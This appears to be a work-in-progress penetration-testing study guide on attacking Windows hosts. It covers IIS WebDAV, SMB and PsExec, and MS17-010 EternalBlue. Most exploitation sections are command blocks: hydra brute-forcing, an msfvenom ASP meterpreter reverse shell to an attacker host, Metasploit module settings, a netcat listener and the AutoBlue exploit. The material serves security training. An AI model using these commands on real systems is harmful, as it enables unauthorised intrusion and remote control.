# Table of contents (WiP)

- [Intro to attacks](#1)
- [Windows](#2)
  - [Windows vulnerabilities](#2.1)
    - [Types of vulnerabilities](#2.1.1)
  - [Frequently exploited Windows vulnerabilities](#2.2)
  - [Exploiting Windows vulnerabilities](#2.3)
    - [Exploiting Microsoft IIS WebDAV](#2.3.1)
      - [What is Microsoft IIS?](#2.3.1.1)
      - [Exploitation](#2.3.1.2)
    - [Exploiting SMB](#2.3.2)
      - [SMB authentication](2.3.2.1)
      - [PsExec](#2.3.2.2)
      - [Exploitation](#2.3.2.3)
      - [MS17-010 Exploitation](#2.3.2.4)
  - [Windows Privilege Escalation](#2.4)
  - [Windows File System vulnerabilities](#2.5)
  - [Windows Credential Dumping](#2.6)

# More to come.

<a id=1></a>
# Intro to attacks

System-based or host-based attacks are attacks that target specific system or host running a specific operating
system such as Linux or Windows.

We need to understand that network services are not the only ones that we can target. There is a world of services out there.
Some more secure than others. Some easier to exploit, some harder.

This kinds of attacks usually come in to play after you've gained access to a target network, where you'll need to exploit
servers, laptops or endpoints on the internal network.

This kinds of attacks focus on exploiting the inherent flaws of an operating system.

Unlike network attacks, host based attacks are more specialized and require an understanding of the underlying OS in place and
the vulnerabilities that plague those OS's.

<a id=2></a>
# Windows

<a id=2.1></a>
## Windows vulnerabilities

Windows is a largely used OS. For that, it has had it large amount of exploits released and vulnerabilities
discovered and exploited. MS08-067 (Conflicker), MS17-010 (EternalBlue) are examples of this.

Given the updates and new versions of Windows being released, many users do not upgrade to the latest and greatest.
Many times this makes them vulnerable to many kinds of attacks. For example: if a vulnerability is found in Windows 7
nowadays, it probably won't be fixed, since that version has reached EOL (End of Life).

Windows by itself when installed is insecure by default. It is not configured to run proactively and securely. It gives
user control over the security controls that might or might not be implemented into their systems, but this is dangerous.
What was the last time you saw or heard a Windows user talking about configuring their firewall? Changing their login password
every X months? ;)

<a id=2.1.1></a>
### Types of vulnerabilities

- Information disclosure: allows an attacker to access confidential information.
- Buffer overflows: allows attacker to write data to a buffer and overrun the allocated one, consequently
  writing data to allocated memory addresses.
- Remote code execution: allows attackers to remotely execute arbitrary code and commands.
- Privilege escalation: vulnerability that allows attackers to elevate their privileges.
- Denial of Service: allows attackers to waste machine resources to prevent normal functionality of a server 
  or services.

<a id=2.2></a>
## Frequently Exploited Windows Services

Windows has various native services and protocols that can be configured to run 
on a host. These services provide an attacker with an attack vector. These 
can be used to gain access to a target host.

| Protocol           | Ports           | Purpose                                                                                                    |
|------------------- | --------------- | ---------------------------------------------------------------------------------------------------------- |
| Microsoft IIS      | TCP 80/443      | Web server.                                                                                                |
| WebDAV             | TCP 80/443      | HTTP extension that allows clients to update, delete, move and copy files on a web server. Similar to GIT. |
| SMB/CIFS           | TCP 445         | Network file sharing protocol. Used to facilitate the task of sharing files.                               |
| RDP                | TCP 3389        | Remote access protocol. Used to remotely interact with a device.                                           |
| WinRM              | TCP 5986/443    | Remote management protocol used to facilitate access to Windows systems.                                   |

<a id=2.3></a>
## Exploiting Windows vulnerabilities

<a id=2.3.1></a>
### Exploiting Microsoft IIS WebDAV

<a id=2.3.1.1></a>
#### What is Microsoft IIS?

It is a proprietary extensible web server developed by Microsoft for the Windows NT kernel.

It can be used to host web applications as well as webpages and provides administrators with
a robust GUI for managing websites.

It can host both static and dynamic websites written in ASP.NET and PHP.

Tipically runs on port 80 and 443 (SSL). It supports the following file extensions:

- .asp 
- .aspx
- .config
- .php

<a id=2.3.1.2></a>
#### But what is a WebDAV?

WebDAV (Web-based Distributed Authoring and Versioning) is a set of HTTP extensions that allow users
to collaboratively edit and manage files on remote web servers.

It essentially enables a git extension on the HTTP protocol. And as so, it also runs usually on ports 80 and 
443. 

To connect to WebDAV, you have to pass valid credentials. This is because it implements authentication in the form
of user and password.

<a id=2.3.1.3></a>
#### Exploitation

The first steps to exploit WebDAV is to check for the following:

- Is it running on an IIS server?
- Try bruteforcing credentials.
- Authenticate and upload a malicious ASP payload to execute 
  arbitrary commands.

Some tools we can use are:

- davtest: Scan, authenticate and exploit a WebDAV server.
- cadaver: Upload and download files, on-screen display, editing,
  namespace operations, collection creation and deletion, property
  manipulation and more. It's a CLI client.

```bash
$ nmap -sV [TARGET] # Identify the IIS server.
# A useful script is http-webdav-scan. If an IIS server is found, it'll be used automatically.
$ nmap -sV [TARGET] -p80/443 --script=http-enum 
# Just enumerate the target. You can use ffuf, gobuster, etc.
$ hydra -L /path/to/users -P /path/to/passwords [TARGET] http-get /webdav-directory
$ davtest -auth user:password -url [TARGET/webdav-endpoint] 
$ cadaver http://[IP]/webdav-endpoint
Username: user
Password: pass
# Now we should have a pseudoterminal.
> put /path/to/shell
# Depending on the output of davtest, you could upload different types of files. In this case,
# webshells. But you'll need to pick one that will actually work!
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER IP] LPORT=[ATTACKER PORT] -f asp > shell.asp
# Upload and execute through cadaver.
# The payload generated will be 32 bit by default. 
msf5 > use exploit/windows/iis/iis_webdav_upload_asp
msf5 exploit > set HttpUsername [USERNAME]
msf5 exploit > set HttpPassword [PASSWORD]
msf5 exploit > set RHOSTS [TARGET]
# You can pick a custom payload, but the windows/meterpreter/reverse_tcp one is pretty good.
# Also: if you use this module, you don't have to manually create a payload. The console will
# do it for you.
# Plus: when ran, it uploads, runs and deletes the ASP payload.
msf5 > use exploit/multi/handler
msf5 exploit > set LHOST [ATTACKER IP]
msf5 exploit > set LPORT [ATTACKER PORT]
msf5 exploit > set payload windows/meterpreter/reverse_tcp
```

<a id=2.3.2></a>
### Exploiting SMB

Since we already know what SMB is from previous modules, we'll jump to the exploitation part.

Note: SMB usually runs on port 445. Older versions run alongside NetBIOS in port 139.

Samba is the open source implementation of SMB. We will focus on SMB first, and we'll see Samba
later.

<a id=2.3.2.1></a>
#### SMB authentication

There are two SMB auth levels:

- User authentication: users must prove a username and password in order to authenticate
with the SMB server in order to access a share.
- Share authentication: Users must provide a password in order to access a restricted share.

Both levels use a challenge response authentication system.

A -> B Authentication Request
B -> A Encrypted string with user's hash
A -> B Encrypted string
B -> A Access granted.

<a id=2.3.2.2></a>
#### PSExec

Lightweight Telnet implementation developed by Microsoft that allows access to execute processes on 
remote systems using any user's credentials. It authenticates via SMB.

We can use PSExec to legitimately authenticate to a server and run arbitrary command or launch a remote
command prompt.

Common techniques to gain access to credentials is through SMB brute forcing. Only after we gain credentials
we will be able to execute commands.

<a id=2.3.2.3></a>
#### Exploitation
```bash
msf5 > use auxiliary/scaner/smb/smb_login
msf5 > set RHOSTS [TARGET]
msf5 > set USER_FILE /path/to/usernames
msf5 > set PASS_FILE /path/to/passwords
msf5 > set verbose FALSE
# Now lets use PsExec.
$ psexec.py [USERNAME]@[IP] [PROGRAM TO EXECUTE]
Password: [PASSWORD]
C:\Windows\system32> echo jaked!!!!!
jaked!!!!!
msf5 > set exploit/windows/smb/psexec
msf5 > set RHOSTS [TARGET]
msf5 > set SMBUser [USERNAME]
msf5 > set SMBPass [PASSWORD]
msf5 > set LHOST [ATTACKER IP]
msf5 > set LPORT [ATTACKER PORT]
```

<a id=2.3.2.4></a>
#### MS17-010 SMB Exploitation

```bash
$ nmap -p445 --script smb-vuln-ms17-010 [TARGET]
# Script to check if the MS17-010 vulnerability exists or not.
$ git clone https://github.com/3ndG4me/AutoBlue-MS17-010
$ cd AutoBlue-MS17-010/shellcode
$ chmod +x shell_prep.sh
$ ./shell_prep.sh
# Do what the programs tells you to do.
# It will generate both x86 and x64 bit shellcodes. We will use 
# those for exploitation.
# Choose between sc_x86.bin or sc_x64.bin, depending on architecture.
# If unknown, go for a 32 bit payload. 
$ cd ..
# Open another shell and prepare a Netcat listener.
$ nc -nlvp [PORT]
# Then on the AutoBlue-MS17-010 directory run the following
$ python eternalblue_exploit[7-8-10].py [ATTACKER IP] shellcode/[sc_x86.bin/sc_x64.bin]
# Now the Metasploit way.
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit > use payload windows/meterpreter/reverse_tcp # If the target is x86.
msf5 exploit > use payload windows/x64/meterpreter/reverse_tcp # If the target is x64.
msf5 exploit > set RHOSTS [TARGET]
msf5 exploit > set LHOST [ATTACKER IP]
msf5 exploit > set LPORT [ATTACKER PORT]
msf5 exploit > exploit
```


<a id=2.4></a>
## Windows Privilege Escalation
<a id=2.5></a>
## Windows File System vulnerabilities
<a id=2.6></a>
## Windows Credential Dumping
